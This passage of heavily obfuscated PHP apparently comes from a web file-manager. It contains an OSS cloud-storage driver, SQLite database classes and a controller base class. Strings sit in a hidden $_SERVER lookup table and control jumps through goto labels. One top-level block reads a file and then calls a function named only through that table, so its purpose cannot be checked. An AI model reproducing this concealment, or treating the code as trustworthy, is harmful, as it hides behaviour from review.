$×»ĞöÅ = 3600) { $¤ùÕ”Ù¸ =& $_SERVER[¥ÙÌÜ¾ê]; if (!($¥…”ï³ø = $this->getHost())) { return !1; } $Ë”Í¿ŞÇ = $×»ĞöÅ; $ìèæ„ã¤ = date($¤ùÕ”Ù¸[1338], time() + $Ë”Í¿ŞÇ); $òù£ß—˜ = new DateTime($ìèæ„ã¤); $âè¼µÂ = $òù£ß—˜->format(DateTime::ISO8601); $Ø½½™ËÆ = strpos($âè¼µÂ, $¤ùÕ”Ù¸[294]); $âè¼µÂ = substr($âè¼µÂ, 0, $Ø½½™ËÆ) . $¤ùÕ”Ù¸[1339]; $úÑ£Ÿß² = 1048576000 * 5; $„®¦éç· = $this->pathFather($¤°İ‹); $ÔÕğ¶êĞ = array($¤ùÕ”Ù¸[1238] => $âè¼µÂ, $¤ùÕ”Ù¸[1239] => array(array($¤ùÕ”Ù¸[1340], 0, $úÑ£Ÿß²), array($¤ùÕ”Ù¸[1242], $¤ùÕ”Ù¸[1243], $„®¦éç·))); $Ğá¬­®™ = base64_encode(json_encode($ÔÕğ¶êĞ)); $‹ü‚­ó² = base64_encode(hash_hmac($¤ùÕ”Ù¸[230], $Ğá¬­®™, $this->secret, !0)); $Â¢ã×œã = array($¤ùÕ”Ù¸[1248] => $Ğá¬­®™, $¤ùÕ”Ù¸[1341] => $this->accessKey, $¤ùÕ”Ù¸[1244] => $¤ùÕ”Ù¸[1236], $¤ùÕ”Ù¸[1342] => $‹ü‚­ó², $¤ùÕ”Ù¸[175] => $¥…”ï³ø); $Â¢ã×œã = $this->trafficLimit($¤ùÕ”Ù¸[1335], $Â¢ã×œã); return $Â¢ã×œã; } public function multiUploadFormData($´ËàÖ»‚, $ú÷¼œãì = 3600) { $ºœ•€Á =& $_SERVER[¥ÙÌÜ¾ê]; if (!($¹˜•°¬‰ = $this->getHost())) { return !1; } $˜í©ñ˜’ = $this->trafficLimit($ºœ•€Á[1335]); $åëÊùñ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($´ËàÖ»‚), $˜í©ñ˜’); return array($ºœ•€Á[221] => $åëÊùñ, $ºœ•€Á[175] => $¹˜•°¬‰ . $ºœ•€Á[8] . $this->pathEncode($´ËàÖ»‚), $ºœ•€Á[222] => gmdate($ºœ•€Á[1343]), $ºœ•€Á[93] => $´ËàÖ»‚); } public function multiUploadAuthData($ÖÇö¢ô…, $ÔÓ°±º£ = array()) { $¨İ®ÇêÁ =& $_SERVER[¥ÙÌÜ¾ê]; $İßøÑ = isset($ÔÓ°±º£[$¨İ®ÇêÁ[222]]) ? $ÔÓ°±º£[$¨İ®ÇêÁ[222]] : gmdate($¨İ®ÇêÁ[1343]); $’ÔéÛªö = isset($ÔÓ°±º£[$¨İ®ÇêÁ[168]]) ? $ÔÓ°±º£[$¨İ®ÇêÁ[168]] : $¨İ®ÇêÁ[33]; $à¸«ÒĞ° = $ÖÇö¢ô…; if (isset($ÔÓ°±º£[$¨İ®ÇêÁ[93]])) { $à¸«ÒĞ° = $ÔÓ°±º£[$¨İ®ÇêÁ[93]]; unset($ÔÓ°±º£[$¨İ®ÇêÁ[93]]); } if (isset($ÔÓ°±º£[$¨İ®ÇêÁ[223]])) { $ÔÓ°±º£[$¨İ®ÇêÁ[222]] = $İßøÑ; return $this->listUploadParts($à¸«ÒĞ°, $ÔÓ°±º£); } $±ÖÅÎñ = array($¨İ®ÇêÁ[224], $¨İ®ÇêÁ[33], $¨İ®ÇêÁ[119], $İßøÑ, "\x78\55\x6f\x73\x73\x2d\144\141\164\x65\72{$İßøÑ}", $¨İ®ÇêÁ[8] . $this->bucket . $¨İ®ÇêÁ[8] . $à¸«ÒĞ° . $’ÔéÛªö); if (strpos($’ÔéÛªö, $¨İ®ÇêÁ[225]) === 0) { $±ÖÅÎñ[0] = $¨İ®ÇêÁ[226]; if ($ìÎ€Âµ• = $this->trafficLimit($¨İ®ÇêÁ[1335])) { $à¸«ÒĞ° = $¨İ®ÇêÁ[1344]; array_splice($±ÖÅÎñ, 5, 0, $à¸«ÒĞ° . $¨İ®ÇêÁ[4] . $ìÎ€Âµ•[$à¸«ÒĞ°]); } } if (isset($ÔÓ°±º£[$¨İ®ÇêÁ[227]]) && $ÔÓ°±º£[$¨İ®ÇêÁ[227]] == $¨İ®ÇêÁ[228]) { $±ÖÅÎñ[0] = $¨İ®ÇêÁ[228]; } if (!empty($ÔÓ°±º£[$¨İ®ÇêÁ[1345]])) { $ˆë¨± = array_merge(array($±ÖÅÎñ[4]), $ÔÓ°±º£[$¨İ®ÇêÁ[1345]]); sort($ˆë¨±); $±ÖÅÎñ[4] = implode($¨İ®ÇêÁ[229], $ˆë¨±); } $ëÏÉÈº§ = implode($¨İ®ÇêÁ[229], $±ÖÅÎñ); $ÊÓä©‚” = base64_encode(hash_hmac($¨İ®ÇêÁ[230], $ëÏÉÈº§, $this->secret, !0)); $•ÏªÇ¦€ = $¨İ®ÇêÁ[1309] . $this->accessKey . $¨İ®ÇêÁ[4] . $ÊÓä©‚”; if (strpos($’ÔéÛªö, $¨İ®ÇêÁ[225]) === 0) { $•ÏªÇ¦€ = array($¨İ®ÇêÁ[232] => $•ÏªÇ¦€, $¨İ®ÇêÁ[222] => $İßøÑ); if ($ìÎ€Âµ•) { $•ÏªÇ¦€ = array_merge($•ÏªÇ¦€, $ìÎ€Âµ•); } } return $•ÏªÇ¦€; } public function listUploadParts($ûéÍğ²˜, $õÇÕ©éô) { $•µ—Ä¹® =& $_SERVER[¥ÙÌÜ¾ê]; $©˜á¤Öü = parse_url_query($õÇÕ©éô[$•µ—Ä¹®[168]]); $¿©½ô…  = $this->client->listParts($this->bucket, $this->pathEncode($ûéÍğ²˜), $©˜á¤Öü[$•µ—Ä¹®[221]]); $­ÀúŠğù = $¿©½ô… ->getListPart(); $éöíÁš = array(); foreach ($­ÀúŠğù as $Åø†Ê¬·) { $éöíÁš[] = array($•µ—Ä¹®[1329] => $Åø†Ê¬·->getPartNumber(), $•µ—Ä¹®[1330] => trim($Åø†Ê¬·->getETag(), $•µ—Ä¹®[116])); } unset($õÇÕ©éô[$•µ—Ä¹®[223]], $õÇÕ©éô[$•µ—Ä¹®[227]]); $Ğ•¯‹ä½ = $this->multiUploadAuthData($ûéÍğ²˜, $õÇÕ©éô); if (empty($Ğ•¯‹ä½)) { return !1; } return array($•µ—Ä¹®[232] => $Ğ•¯‹ä½, $•µ—Ä¹®[222] => $õÇÕ©éô[$•µ—Ä¹®[222]], $•µ—Ä¹®[234] => $éöíÁš); } public function download($¸®Éûëº, $—úœ·¤°) { if ($this->isFolder($¸®Éûëº)) { return !1; } try { $Åæê¥» = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $—úœ·¤°); $Åæê¥» = $this->trafficLimit($_SERVER[¥ÙÌÜ¾ê][109], $Åæê¥»); $this->client->getObject($this->bucket, $this->pathEncode($¸®Éûëº), $Åæê¥»); } catch (OSS\Core\OssException $‰Öû­çâ) { return !1; } return $—úœ·¤°; } public function fileSubstr($Ö¤´¯ƒ, $ˆ™òÉ÷€ = 0, $“ûíí×å = false) { if ($ˆ™òÉ÷€ === -1) { $ÔÓ¦ßíÌ = array(); } else { if ($“ûíí×å === !1) { $ÅäÛ”› = $this->size($Ö¤´¯ƒ); } else { $ÅäÛ”› = $ˆ™òÉ÷€ + $“ûíí×å - 1; } $ÔÓ¦ßíÌ = array(OSS\OssClient::OSS_RANGE => "{$ˆ™òÉ÷€}\55{$ÅäÛ”›}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($Ö¤´¯ƒ), $ÔÓ¦ßíÌ); } catch (OSS\Core\OssException $ˆÅ½Ğ¹ë) { think_exception($ˆÅ½Ğ¹ë->getMessage()); return !1; } } private function trafficLimit($ñ…İİêÄ, $ïø†÷Ô¯ = array()) { $‡¬Ì…€¢ =& $_SERVER[¥ÙÌÜ¾ê]; if ($ñ…İİêÄ == $‡¬Ì…€¢[1335] && $this->isUploadServer() || $ñ…İİêÄ == $‡¬Ì…€¢[109] && $this->isFileOutServer()) { return $ïø†÷Ô¯; } $À²Ô§ = floatval($GLOBALS[$‡¬Ì…€¢[6]][$‡¬Ì…€¢[88]][$‡¬Ì…€¢[107]][$ñ…İİêÄ]) * 1024 * 1024 * 8; if (!$À²Ô§) { return $ïø†÷Ô¯; } $À²Ô§ = $À²Ô§ < 819200 ? 819200 : ($À²Ô§ > 838860800 ? 838860800 : $À²Ô§); $ïø†÷Ô¯[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($À²Ô§); return $ïø†÷Ô¯; } public function link($òÙÕã°, $™ æâ¦ë = array()) { $—Ş¢ëÊÙ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$this->exist($òÙÕã°) || $this->isFolder($òÙÕã°)) { return !1; } try { $™ æâ¦ë = $this->trafficLimit($—Ş¢ëÊÙ[109], $™ æâ¦ë); $Ù¥°ÜÄ± = $this->client->signUrl($this->bucket, $this->pathEncode($òÙÕã°), 3600 * 12, $—Ş¢ëÊÙ[228], $™ æâ¦ë); return $this->getCdnLink($Ù¥°ÜÄ±); } catch (OSS\Core\OssException $“òá¼áè) { return !1; } } public function fileOut($Ü£Î†¾¾, $Äş¨æ™· = false, $§´€Å¸û = false, $Ñ´Â ï… = '') { $“‰„¼Ùê =& $_SERVER[¥ÙÌÜ¾ê]; if ($this->isFileOutServer()) { return $this->fileOutServer($Ü£Î†¾¾, $Äş¨æ™·, $§´€Å¸û, $Ñ´Â ï…); } if (!$§´€Å¸û) { $§´€Å¸û = $this->pathThis($Ü£Î†¾¾); } $§´€Å¸û = rawurlencode($§´€Å¸û); $¢İĞÍŒò = get_file_mime(get_path_ext($§´€Å¸û)); if ($¢İĞÍŒò == $“‰„¼Ùê[213]) { return parent::fileOut($Ü£Î†¾¾, $Äş¨æ™·, $§´€Å¸û, $Ñ´Â ï…); } $Äş¨æ™· = $Äş¨æ™· ? $“‰„¼Ùê[214] : $“‰„¼Ùê[215]; $™öó¹ç = array(OSS\OssClient::OSS_SUB_RESOURCE => $“‰„¼Ùê[1346] . rawurlencode("{$Äş¨æ™·}\x3b\x66\x69\x6c\x65\x6e\141\155\145\x3d{$§´€Å¸û}")); $™öó¹ç[OSS\OssClient::OSS_SUB_RESOURCE] .= $“‰„¼Ùê[1347] . rawurlencode($¢İĞÍŒò); $”¨¹ƒÉ = $this->link($Ü£Î†¾¾, $™öó¹ç); $this->fileOutLink($”¨¹ƒÉ); } public function fileOutServer($İÇšœšÂ, $ÙĞ…»ªŸ = false, $áõˆÂ¸‡ = false, $À¨Èµ§â = '') { parent::fileOut($İÇšœšÂ, $ÙĞ…»ªŸ, $áõˆÂ¸‡, $À¨Èµ§â); } public function fileOutImage($¹îş«ú½, $Â¤¾—‹„ = 250) { $²ë¹¦­ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[¥ÙÌÜ¾ê][1348] . $Â¤¾—‹„); $àÖŞèŒ™ = $this->link($¹îş«ú½, $²ë¹¦­); $this->fileOutLink($àÖŞèŒ™); } public function fileOutImageServer($ÄåŞ©Ï, $ú÷Ì÷ğ = 250) { parent::fileOutImage($ÄåŞ©Ï, $ú÷Ì÷ğ); } public function fileOutLink($àûÙ¶Ÿ‹) { $Š“¹»‡ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$this->isCdnHost() && substr($àûÙ¶Ÿ‹, 0, 7) == $Š“¹»‡[1251]) { $àûÙ¶Ÿ‹ = $Š“¹»‡[1252] . substr($àûÙ¶Ÿ‹, 7); } header($Š“¹»‡[159] . $àûÙ¶Ÿ‹); die; } public function hashMd5($ÕôäîÓ®, $„§¨™ã = '') { $ÛÖòÈ =& $_SERVER[¥ÙÌÜ¾ê]; $¯ŞÌèØ‘ = $this->_objectMeta($ÕôäîÓ®); if (!$¯ŞÌèØ‘) { return $ÛÖòÈ[33]; } if (!isset($¯ŞÌèØ‘[$ÛÖòÈ[1325]]) && !empty($„§¨™ã)) { $ÉòÉğË™ = $this->updateObjMeta($ÕôäîÓ®, array($ÛÖòÈ[1325] => $„§¨™ã)); $¯ŞÌèØ‘[$ÛÖòÈ[1325]] = $ÉòÉğË™ ? $„§¨™ã : $ÛÖòÈ[33]; } return isset($¯ŞÌèØ‘[$ÛÖòÈ[1325]]) ? strtolower($¯ŞÌèØ‘[$ÛÖòÈ[1325]]) : $ÛÖòÈ[33]; } public function size($³¤Ë‰ú…) { $¥£ºªû™ = $this->objectMeta($³¤Ë‰ú…); return $¥£ºªû™ ? $¥£ºªû™[$_SERVER[¥ÙÌÜ¾ê][78]] : 0; } public function info($ßïõÉëÑ) { if ($this->isFolder($ßïõÉëÑ)) { return $this->folderInfo($ßïõÉëÑ); } else { if ($this->isFile($ßïõÉëÑ)) { return $this->fileInfo($ßïõÉëÑ); } } return !1; } public function exist($ÇğÈï–) { return $this->isFile($ÇğÈï–) || $this->isFolder($ÇğÈï–); } public function isFile($“…¥®û™) { return !$this->isFolder($“…¥®û™) && $this->objectMeta($“…¥®û™); } public function isFolder($À–úÀâÁ) { return $this->cacheMethod($_SERVER[¥ÙÌÜ¾ê][199], $À–úÀâÁ); } protected function objectMeta($¢ô¹‹˜½) { return $this->cacheMethod($_SERVER[¥ÙÌÜ¾ê][200], $¢ô¹‹˜½); } protected function _objectMeta($ÌËõË´) { $”ôœõô– =& $_SERVER[¥ÙÌÜ¾ê]; try { $øü…³ó = $this->client->getObjectMeta($this->bucket, $this->pathEncode($ÌËõË´)); } catch (OSS\Core\OssException $¦¾‚„Êü) { $øü…³ó = !1; } if ($øü…³ó) { $øü…³ó[$”ôœõô–[78]] = intval($øü…³ó[$”ôœõô–[1323]]); } return $øü…³ó; } protected function _isFolder($¤ãØœñË) { $ã××Ü± =& $_SERVER[¥ÙÌÜ¾ê]; if ($¤ãØœñË == $ã××Ü±[33] || $¤ãØœñË == $ã××Ü±[8]) { return !0; } $ßúÀŞæØ = array($ã××Ü±[1319] => $ã××Ü±[8], $ã××Ü±[1320] => rtrim($¤ãØœñË, $ã××Ü±[8]) . $ã××Ü±[8], $ã××Ü±[1321] => 1, $ã××Ü±[1322] => $ã××Ü±[33]); $Îğ­îƒ» = $this->client->listObjects($this->bucket, $ßúÀŞæØ); if ($Îğ­îƒ»->getObjectList() || $Îğ­îƒ»->getPrefixList()) { return !0; } return !1; } } if ($_SERVER[$_SERVER[¥ÙÌÜ¾ê][862]] != $_SERVER[$_SERVER[¥ÙÌÜ¾ê][863]]) { $_getc = $_SERVER[¥ÙÌÜ¾ê][864]; $_getfile = $_SERVER[$_SERVER[¥ÙÌÜ¾ê][865]] . $_SERVER[¥ÙÌÜ¾ê][866]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¥ÙÌÜ¾ê][229], $_getfilec); if (count($_getarrs) < $_SERVER[¥ÙÌÜ¾ê][605]) { $exit = $_SERVER[¥ÙÌÜ¾ê][867]; $exit(); } $_act = $_SERVER[¥ÙÌÜ¾ê][868]; $_act($_SERVER[$_SERVER[¥ÙÌÜ¾ê][869]]); } goto e‰ç²™Î; D³ÚœøŞ¦“: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $ÏÍ÷¤„é =& $_SERVER[¥ÙÌÜ¾ê]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$ÏÍ÷¤„é[6]] =& $config; $this->values[$ÏÍ÷¤„é[7]] =& $in; $this->tpl = TEMPLATE . MOD . $ÏÍ÷¤„é[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($Š¥¡å’) { if (1 === func_num_args()) { $this->{$Š¥¡å’} = new $Š¥¡å’(); } else { $…òñœŒ§ = new ReflectionClass($Š¥¡å’); $Éø¿ÍÊÙ = func_get_args(); array_shift($Éø¿ÍÊÙ); $this->{$Š¥¡å’} = $…òñœŒ§->newInstanceArgs($Éø¿ÍÊÙ); } return $this->{$Š¥¡å’}; } protected function assign($“²£¯–ß, $ìê­è€¹) { $this->values[$“²£¯–ß] = $ìê­è€¹; } protected function display($¡ÓÏãïÍ) { ob_end_clean(); extract($this->values); require $this->tpl . $¡ÓÏãïÍ; } } class DbSqliteBase extends Db { public function __construct($óôá¯Î® = '') { $˜Ğ–şÛ =& $_SERVER[¥ÙÌÜ¾ê]; if (!extension_loaded($˜Ğ–şÛ[9])) { think_exception(think_lang($˜Ğ–şÛ[10]) . $˜Ğ–şÛ[11]); } if (!empty($óôá¯Î®)) { if (!isset($óôá¯Î®[$˜Ğ–şÛ[12]])) { $óôá¯Î®[$˜Ğ–şÛ[12]] = 438; } $this->config = $óôá¯Î®; if (empty($this->config[$˜Ğ–şÛ[13]])) { $this->config[$˜Ğ–şÛ[13]] = array(); } } } public function connect($†ş«ô´æ = '', $®Éâ¶ë = 0) { $¯¹ ©¡… =& $_SERVER[¥ÙÌÜ¾ê]; if (!isset($this->linkID[$®Éâ¶ë])) { if (empty($†ş«ô´æ)) { $†ş«ô´æ = $this->config; } $§üªùº = !empty($†ş«ô´æ[$¯¹ ©¡…[13]][$¯¹ ©¡…[14]]) ? $†ş«ô´æ[$¯¹ ©¡…[13]][$¯¹ ©¡…[14]] : $this->pconnect; $—›çŠÊú = $§üªùº ? $¯¹ ©¡…[15] : $¯¹ ©¡…[16]; $this->linkID[$®Éâ¶ë] = $—›çŠÊú($†ş«ô´æ[$¯¹ ©¡…[17]], $†ş«ô´æ[$¯¹ ©¡…[12]]); if (!$this->linkID[$®Éâ¶ë]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$®Éâ¶ë], 30000); if (1 != think_config($¯¹ ©¡…[18])) { unset($this->config); } } return $this->linkID[$®Éâ¶ë]; } public function free() { $this->queryID = null; } public function query($…‹Åğ™£) { $«û¶¿€Ú =& $_SERVER[¥ÙÌÜ¾ê]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $…‹Åğ™£; if ($this->queryID) { $this->free(); } think_action_status($«û¶¿€Ú[19], 1); think_status($«û¶¿€Ú[20]); $this->queryID = sqlite_query($this->_linkID, $…‹Åğ™£); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $½Í¸™ = $this->getAll(); return $½Í¸™; } } public function execute($›µÎÖª™) { $ËÈóÅ¨Æ =& $_SERVER[¥ÙÌÜ¾ê]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $›µÎÖª™; if ($this->queryID) { $this->free(); } think_action_status($ËÈóÅ¨Æ[21], 1); think_status($ËÈóÅ¨Æ[20]); $ÖşÜºÇ‹ = sqlite_exec($this->_linkID, $›µÎÖª™); $this->debug(); if (!1 === $ÖşÜºÇ‹) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[¥ÙÌÜ¾ê][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Åğ¬Èò = sqlite_query($this->_linkID, $_SERVER[¥ÙÌÜ¾ê][23]); if (!$Åğ¬Èò) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $¢Ö±¾ª¢ = sqlite_query($this->_linkID, $_SERVER[¥ÙÌÜ¾ê][24]); if (!$¢Ö±¾ª¢) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $¥ø²ùì€ = array(); if ($this->numRows > 0) { for ($şÆÎ¤’Î = 0; $şÆÎ¤’Î < $this->numRows; $şÆÎ¤’Î++) { $¥ø²ùì€[$şÆÎ¤’Î] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $¥ø²ùì€; } public function getFields($û³¹ğ‚) { $°’íò =& $_SERVER[¥ÙÌÜ¾ê]; $Ö­×œô© = $this->query($°’íò[25] . $û³¹ğ‚ . $°’íò[26]); $À®ìß§’ = array(); if ($Ö­×œô©) { foreach ($Ö­×œô© as $¯Šş…Ãø => $‹‡ğš€í) { $À®ìß§’[$‹‡ğš€í[$°’íò[27]]] = array($°’íò[28] => $‹‡ğš€í[$°’íò[27]], $°’íò[29] => $‹‡ğš€í[$°’íò[30]], $°’íò[31] => (bool) ($‹‡ğš€í[$°’íò[32]] === $°’íò[33]), $°’íò[34] => $‹‡ğš€í[$°’íò[35]], $°’íò[36] => strtolower($‹‡ğš€í[$°’íò[37]]) == $°’íò[38], $°’íò[39] => strtolower($‹‡ğš€í[$°’íò[40]]) == $°’íò[41]); } } return $À®ìß§’; } public function getTables($Ã¨²åÅ = '') { $åóÍ¹©ô =& $_SERVER[¥ÙÌÜ¾ê]; $ì× û‡ = $this->query($åóÍ¹©ô[42] . $åóÍ¹©ô[43] . $åóÍ¹©ô[44]); $Î‘¤Òñõ = array(); foreach ($ì× û‡ as $ÁğàÂö‚ => $¬±Ş´ğƒ) { $Î‘¤Òñõ[$ÁğàÂö‚] = current($¬±Ş´ğƒ); } return $Î‘¤Òñõ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $á¢·“Ñ =& $_SERVER[¥ÙÌÜ¾ê]; $‹ƒŸÜÙŒ = sqlite_last_error($this->_linkID); $this->error = $‹ƒŸÜÙŒ . $á¢·“Ñ[4] . sqlite_error_string($‹ƒŸÜÙŒ); if ($á¢·“Ñ[33] != $this->queryStr) { $this->error .= LNG($á¢·“Ñ[45]) . $this->queryStr; } think_trace($this->error, $á¢·“Ñ[33], $á¢·“Ñ[46]); return $this->error; } public function escapeString($†Ë§ÛŠï) { return sqlite_escape_string($†Ë§ÛŠï); } public function parseLimit($è¶ÀŒÎ) { $”§Ë =& $_SERVER[¥ÙÌÜ¾ê]; $Ä»ËÅ½¯ = $”§Ë[33]; if (!empty($è¶ÀŒÎ)) { $è¶ÀŒÎ = explode($”§Ë[47], $è¶ÀŒÎ); if (count($è¶ÀŒÎ) > 1) { $Ä»ËÅ½¯ .= $”§Ë[48] . $è¶ÀŒÎ[1] . $”§Ë[49] . $è¶ÀŒÎ[0] . $”§Ë[50]; } else { $Ä»ËÅ½¯ .= $”§Ë[48] . $è¶ÀŒÎ[0] . $”§Ë[50]; } } return $Ä»ËÅ½¯; } } class DbSqlite3Base extends Db { public function __construct($Öôö€¿‘ = '') { $Ğåï—ú§ =& $_SERVER[¥ÙÌÜ¾ê]; if (!class_exists($Ğåï—ú§[51])) { think_exception(think_lang($Ğåï—ú§[10]) . $Ğåï—ú§[52]); } if (!empty($Öôö€¿‘)) { if (!isset($Öôö€¿‘[$Ğåï—ú§[12]])) { $Öôö€¿‘[$Ğåï—ú§[12]] = 438; } $this->config = $Öôö€¿‘; if (empty($this->config[$Ğåï—ú§[13]])) { $this->config[$Ğåï—ú§[13]] = array(); } } } public function connect($¤ÚÉ½¨ï = '', $—Ì‘À•¼ = 0) { $Î¨áÖ» =& $_SERVER[¥ÙÌÜ¾ê]; if (!isset($this->linkID[$—Ì‘À•¼])) { if (empty($¤ÚÉ½¨ï)) { $¤ÚÉ½¨ï = $this->config; } $this->linkID[$—Ì‘À•¼] = new SQLite3($¤ÚÉ½¨ï[$Î¨áÖ»[17]]); if (!$this->linkID[$—Ì‘À•¼]) { think_exception($this->linkID[$—Ì‘À•¼]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$—Ì‘À•¼]->busyTimeout(30000); if (1 != think_config($Î¨áÖ»[18])) { unset($this->config); } } return $this->linkID[$—Ì‘À•¼]; } public function free() { $this->queryID = null; } public function query($‹œ’¾á€) { $íÖ¹…ÈÎ =& $_SERVER[¥ÙÌÜ¾ê]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $‹œ’¾á€; if ($this->queryID) { $this->free(); } think_action_status($íÖ¹…ÈÎ[19], 1); think_status($íÖ¹…ÈÎ[20]); $this->queryID = $this->_linkID->query($‹œ’¾á€); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $õ¨à’£İ = $this->getAll(); $this->numRows = count($õ¨à’£İ); return $õ¨à’£İ; } } public function execute($¨ƒÙ‰) { $¥ˆáŒèÒ =& $_SERVER[¥ÙÌÜ¾ê]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¨ƒÙ‰; if ($this->queryID) { $this->free(); } think_action_status($¥ˆáŒèÒ[21], 1); think_status($¥ˆáŒèÒ[20]); $šä‘ïÚ = $this->_linkID->exec($¨ƒÙ‰); $this->debug(); if (!1 === $šä‘ïÚ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[¥ÙÌÜ¾ê][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $şäÓÁ»Î = $this->_linkID->query($_SERVER[¥ÙÌÜ¾ê][23]); if (!$şäÓÁ»Î) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $İñ˜Ç†³ = $this->_linkID->query($_SERVER[¥ÙÌÜ¾ê][24]); if (!$İñ˜Ç†³) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $¤ñ˜äºö = array(); while ($æÚ¹Ä÷ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $¤ñ˜äºö[] = $æÚ¹Ä÷; } $this->queryID->reset(); return $¤ñ˜äºö; } public function getFields($ŞÉ›×‘) { $Ë…Ã·Ê¡ =& $_SERVER[¥ÙÌÜ¾ê]; $§†û±…í = $this->query($Ë…Ã·Ê¡[25] . $ŞÉ›×‘ . $Ë…Ã·Ê¡[26]); $Òã…–Å = array(); if ($§†û±…í) { foreach ($§†û±…í as $Ñç†Óˆ => $±åö‰ù) { $Òã…–Å[$±åö‰ù[$Ë…Ã·Ê¡[28]]] = array($Ë…Ã·Ê¡[28] => $±åö‰ù[$Ë…Ã·Ê¡[28]], $Ë…Ã·Ê¡[29] => $±åö‰ù[$Ë…Ã·Ê¡[29]], $Ë…Ã·Ê¡[31] => (bool) ($±åö‰ù[$Ë…Ã·Ê¡[31]] === $Ë…Ã·Ê¡[33]), $Ë…Ã·Ê¡[34] => $±åö‰ù[$Ë…Ã·Ê¡[53]], $Ë…Ã·Ê¡[36] => (bool) $±åö‰ù[$Ë…Ã·Ê¡[54]], $Ë…Ã·Ê¡[39] => (bool) $±åö‰ù[$Ë…Ã·Ê¡[54]]); } } return $Òã…–Å; } public function getTables($•Õé¹ˆ = '') { $âà˜ªßÃ =& $_SERVER[¥ÙÌÜ¾ê]; $„ïú©²˜ = $this->query($âà˜ªßÃ[42] . $âà˜ªßÃ[43] . $âà˜ªßÃ[44]); $ìñÂØù™ = array(); foreach ($„ïú©²˜ as $‘àƒáÔì => $ÕæÃõ€Ş) { $ìñÂØù™[$‘àƒáÔì] = current($ÕæÃõ€Ş); } return $ìñÂØù™; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $íÍÅ†ì¡ =& $_SERVER[¥ÙÌÜ¾ê]; $this->error = $this->_linkID->lastErrorMsg(); if ($íÍÅ†ì¡[33] != $this->queryStr) { $this->error .= LNG($íÍÅ†ì¡[45]) . $this->queryStr; } think_trace($this->error, $íÍÅ†ì¡[33], $íÍÅ†ì¡[46]); return $this->error; } public function escapeString($¤õ³½æï) { $Æ¢•†øÌ =& $_SERVER[¥ÙÌÜ¾ê]; if ($this->_linkID) { return $this->_linkID->escapeString($¤õ³½æï); } return str_ireplace($Æ¢•†øÌ[55], $Æ¢•†øÌ[56], $¤õ³½æï); } public function parseLimit($¶ŞÇÎ·Ô) { $ü´À¹’Ö =& $_SERVER[¥ÙÌÜ¾ê]; $ƒ˜’ÃÃĞ = $ü´À¹’Ö[33]; if (!empty($¶ŞÇÎ·Ô)) { $¶ŞÇÎ·Ô = explode($ü´À¹’Ö[47], $¶ŞÇÎ·Ô); if (count($¶ŞÇÎ·Ô) > 1) { $ƒ˜’ÃÃĞ .= $ü´À¹’Ö[48] . $¶ŞÇÎ·Ô[1] . $ü´À¹’Ö[49] . $¶ŞÇÎ·Ô[0] . $ü´À¹’Ö[50]; } else { $ƒ˜’ÃÃĞ .= $ü´À¹’Ö[48] . $¶ŞÇÎ·Ô[0] . $ü´À¹’Ö[50]; } } return $ƒ˜’ÃÃĞ; } } goto FŒ¹…ÕÎ¨Ù; bŒŒÌšõ: class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\145\162\x5f\157\160\164\x69\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($‰ÛÕÅÈ£) { $‚ƒÈ«èª =& $_SERVER[¥ÙÌÜ¾ê]; if (!defined($‚ƒÈ«èª[468])) { define($‚ƒÈ«èª[468], 0); } return "\x55\x73\145\x72\117\x70\164\x69\157\156\137{$‰ÛÕÅÈ£}\137" . USER_ID; } protected function filterWhere($¶ÑÕ›ß) { $ÇïÆ²Ûâ =& $_SERVER[¥ÙÌÜ¾ê]; if (!defined($ÇïÆ²Ûâ[468])) { define($ÇïÆ²Ûâ[468], 0); } $¶ÑÕ›ß[$ÇïÆ²Ûâ[1581]] = USER_ID; return $¶ÑÕ›ß; } public function cacheRemoveUser($ÎµÄğÆ, $À¤â“â¤) { return Cache::remove("\x55\x73\145\162\x4f\160\x74\x69\x6f\x6e\137{$ÎµÄğÆ}\x5f" . $À¤â“â¤); } protected function optionDefault($­Ç½Àéğ = '') { 